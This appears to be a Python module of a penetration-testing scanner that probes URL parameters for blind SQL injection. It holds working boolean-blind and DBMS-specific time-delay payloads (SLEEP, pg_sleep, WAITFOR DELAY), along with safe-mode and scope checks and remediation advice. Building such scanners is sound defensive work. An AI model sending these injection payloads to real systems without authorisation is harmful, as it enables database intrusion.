"""PENTRIX ARSENAL module: blind SQL injection.

Complements the error-based sqli_mod with the two blind families:

1. Boolean-blind: true/false condition pairs in string, numeric and
   stacked contexts (' AND '1'='1 vs ' AND '1'='2, " AND "1"="1 vs
   " AND "1"="2, AND 1=1 vs AND 1=2). A consistent status/length/hash
   difference, confirmed by re-requesting the true payload, means the
   condition reached the SQL query.
2. Time-based blind: DBMS-specific delay payloads (MySQL SLEEP(3),
   PostgreSQL pg_sleep(3), MSSQL WAITFOR DELAY '0:0:3'). A response
   delayed past the threshold while the baseline is fast, confirmed by
   a repeat, means the payload executed.

INTRUSIVE = True: time-based payloads deliberately burn database time,
so safe mode requires explicit opt-in. Delays are kept to 3 seconds
and payload counts are small.
"""

import hashlib
import time
import urllib.parse

from arsenal.findings import make_finding
from arsenal.http import fetch

NAME = "sqli_blind"
DESCRIPTION = (
    "Detects blind SQL injection with boolean-based differentials and "
    "DBMS-specific time-based payloads."
)
TARGET_KIND = "url"
INTRUSIVE = True

TIMEOUT = 15
MAX_PARAMS = 3
SLEEP_SECONDS = 3
# Timing gate with generous margins for localhost: the deliberate delay is
# SLEEP_SECONDS, so require only SLEEP_SECONDS - 1.0s. Normal jitter is
# tens of ms on localhost, so a 1.0s margin can never flake, while a
# random multi-second stall is still needed (twice, via the repeat) to
# flag. The baseline gate (1.5s, see _run) is ~300x a localhost baseline.
TIME_THRESHOLD = SLEEP_SECONDS - 1.0

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2", "string/single-quote"),
    ("' AND '1'='1' -- -", "' AND '1'='2' -- -", "string/comment"),
    ('" AND "1"="1', '" AND "1"="2', "string/double-quote"),
    (" AND 1=1", " AND 1=2", "numeric"),
    (" AND 1=1 -- -", " AND 1=2 -- -", "numeric/comment"),
]

TIME_PAYLOADS = [
    ("' AND SLEEP(%d) -- -" % SLEEP_SECONDS, "MySQL"),
    ("'; SELECT pg_sleep(%d) -- -" % SLEEP_SECONDS, "PostgreSQL"),
    ("'; WAITFOR DELAY '0:0:%d' -- -" % SLEEP_SECONDS, "MSSQL"),
]


def _timeout(ctx):
    cfg = getattr(ctx, "config", None)
    if isinstance(cfg, dict):
        return cfg.get("timeout", TIMEOUT)
    if cfg is not None:
        return getattr(cfg, "timeout", TIMEOUT)
    return TIMEOUT


def _log(ctx, level, msg):
    log = getattr(ctx, "log", None)
    if log is None:
        return
    try:
        getattr(log, level, log.warning)(msg)
    except Exception:
        pass


def _is_http_url(target):
    try:
        parts = urllib.parse.urlsplit(target)
    except Exception:
        return False
    return parts.scheme in ("http", "https") and bool(parts.netloc)


def _host_of(url):
    try:
        return urllib.parse.urlsplit(url).hostname or ""
    except Exception:
        return ""


def _in_scope(target, ctx):
    scope = getattr(ctx, "scope", None)
    if scope is None:
        return True
    try:
        return bool(scope.contains(_host_of(target)))
    except Exception:
        return True


def _finding(**kwargs):
    kwargs.setdefault("module", NAME)
    return make_finding(**kwargs)


def _params(url):
    try:
        return urllib.parse.parse_qsl(urllib.parse.urlsplit(url).query,
                                      keep_blank_values=True)
    except Exception:
        return []


def _with_param(url, idx, new_value):
    parts = urllib.parse.urlsplit(url)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    q[idx] = (q[idx][0], new_value)
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path,
         urllib.parse.urlencode(q), parts.fragment))


def _fetch_timed(url, ctx, timeout=None):
    start = time.monotonic()
    try:
        resp = fetch(url, timeout=timeout or _timeout(ctx),
                     allow_redirects=True, ctx=ctx)
    except Exception as exc:
        _log(ctx, "debug", "%s: request failed for %s: %s" % (NAME, url, exc))
        return None, 0.0
    return resp, time.monotonic() - start


def _fp(resp):
    if resp is None:
        return (0, 0, "")
    status, _h, body, _f = resp
    body = body or b""
    return (status, len(body), hashlib.sha256(body).hexdigest()[:16])


def run(target, ctx):
    """Probe URL parameters for blind SQL injection."""
    try:
        return _run(target, ctx)
    except Exception as exc:
        _log(ctx, "warning", "%s failed on %s: %s" % (NAME, target, exc))
        return []


def _run(target, ctx):
    if INTRUSIVE and getattr(ctx, "safe_mode", False) \
            and not getattr(ctx, "allow_intrusive", False):
        _log(ctx, "warning", "%s skipped: safe mode blocks intrusive modules"
             % NAME)
        return []
    if not _is_http_url(target):
        return []
    if not _in_scope(target, ctx):
        _log(ctx, "warning", "%s: target out of scope: %s" % (NAME, target))
        return []
    params = _params(target)
    if not params:
        return []
    findings = []

    baseline_resp, baseline_elapsed = _fetch_timed(target, ctx)

    for idx, (pname, pval) in enumerate(params[:MAX_PARAMS]):
        # 1. Boolean-blind.
        for true_p, false_p, context in BOOLEAN_PAIRS:
            t_url = _with_param(target, idx, pval + true_p)
            f_url = _with_param(target, idx, pval + false_p)
            t_resp, _t = _fetch_timed(t_url, ctx)
            f_resp, _f = _fetch_timed(f_url, ctx)
            if t_resp is None or f_resp is None:
                continue
            t_fp, f_fp = _fp(t_resp), _fp(f_resp)
            if t_fp[0] == 200 and f_fp[0] == 200 and t_fp[2] != f_fp[2]:
                t2_resp, _t2 = _fetch_timed(t_url, ctx)
                if t2_resp is not None and _fp(t2_resp)[2] == t_fp[2]:
                    findings.append(_finding(
                        target=target,
                        severity="high",
                        title="Boolean-blind SQLi in %s (%s)" % (pname, context),
                        description=(
                            "True/false SQL conditions appended to %s "
                            "returned consistently different responses, "
                            "which means the injected condition reached the "
                            "SQL query." % pname),
                        evidence=(
                            "Request (true): %s\nTrue: status=%s len=%s "
                            "hash=%s\nFalse: status=%s len=%s hash=%s"
                            % (t_url, t_fp[0], t_fp[1], t_fp[2],
                               f_fp[0], f_fp[1], f_fp[2])),
                        confidence="strong",
                        cwe="CWE-89",
                        remediation="Use parameterized queries; never "
                                    "concatenate input into SQL."))
                    break
        # 2. Time-based blind.
        for payload, dbms in TIME_PAYLOADS:
            probe_url = _with_param(target, idx, pval + payload)
            resp, elapsed = _fetch_timed(probe_url, ctx)
            if resp is None:
                continue
            if elapsed >= TIME_THRESHOLD and baseline_elapsed < 1.5:
                resp2, elapsed2 = _fetch_timed(probe_url, ctx)
                if resp2 is not None and elapsed2 >= TIME_THRESHOLD:
                    findings.append(_finding(
                        target=target,
                        severity="high",
                        title="Time-based blind SQLi in %s (%s)" % (pname, dbms),
                        description=(
                            "A %s delay payload in %s delayed the response "
                            "by %.1fs twice while the baseline took %.2fs, "
                            "which means the payload executed in the "
                            "database." % (dbms, pname, elapsed,
                                           baseline_elapsed)),
                        evidence=(
                            "Request: %s\nBaseline: %.2fs | "
                            "Probe: %.2fs, %.2fs (repeat)"
                            % (probe_url, baseline_elapsed, elapsed,
                               elapsed2)),
                        confidence="strong",
                        cwe="CWE-89",
                        remediation="Use parameterized queries; apply "
                                    "least-privilege DB accounts."))
                    break
    return findings
